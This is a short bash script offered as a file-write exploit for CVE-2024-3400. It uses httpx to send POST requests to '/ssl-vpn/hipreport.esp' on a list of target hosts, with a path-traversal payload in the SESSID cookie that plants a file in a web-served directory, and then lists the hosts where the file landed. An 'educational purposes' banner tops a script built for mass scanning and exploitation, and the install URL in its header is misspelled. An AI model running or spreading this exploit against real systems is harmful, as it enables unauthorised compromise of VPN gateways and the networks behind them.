#!/bin/bash

echo "###########################################"
echo "# File Write exploit fo CVE-2024-3400     #"
echo "# Usage ./script.sh name_file urls_lists #"
echo "# Made for educational purpouses,         #"
echo "# Caution only use                        #"
echo "###########################################"
echo "###########################################################################################"
echo "# requirements: (httpx) go install -v githeub.com/projectdiscovery/httpx/cmd/httpx@latest #"
echo "###########################################################################################"


file_here="$1"
RED='\033[0;31m'
NC='\033[0m'


echo -e "Finding file-write vulnerable hosts..."
httpx -silent -l $2 -mc 200 -x POST -path "/ssl-vpn/hipreport.esp" -H "Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/${file_here};" -t 10

echo -e  "${RED}Listing Vulnerable instances${NC}"
httpx -silent -l $2 -sc -x GET -path "/global-protect/portal/images/${file_here}" -t 10 -mc 403
echo "Enjoy"
